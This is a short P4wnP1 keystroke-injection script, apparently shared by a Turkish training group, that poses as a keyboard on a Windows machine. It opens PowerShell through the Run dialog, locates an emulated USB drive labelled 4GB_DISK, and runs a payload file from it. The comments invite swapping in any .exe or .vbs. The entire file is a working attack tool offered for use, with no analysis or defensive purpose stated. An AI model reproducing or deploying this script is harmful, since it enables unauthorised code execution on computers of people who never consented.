// @KekikAkademi Edit ~
delay(500);
press("ALT SHIFT");
delay(500);
// @KekikAkademi Edit #

// run any payload like .exe .vbs and more
//
// make a new UMS on P4wnP1 6:55 https://www.youtube.com/watch?v=I_BjCdJlCo4 
// put your payload on the UMS of 4GB_DISK 
// replace hello.vbs by yourpayloadname.exe line 21

layout('us') // set layout keyboard US

press("GUI r") // win + r
delay(200)
type("powershell\n") // powershell.exe + enter
delay(500)
type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq '4GB_DISK' } | select name \n") // "4GB_DISK" = name UMS
type("cd $usbpath.name\n") // cd UMS of 4GB_DISK
type("./hello.vbs\n") // run
type("exit\n")

// @KekikAkademi Edit ~
delay(500);
press("ALT SHIFT");
delay(500);
// @KekikAkademi Edit #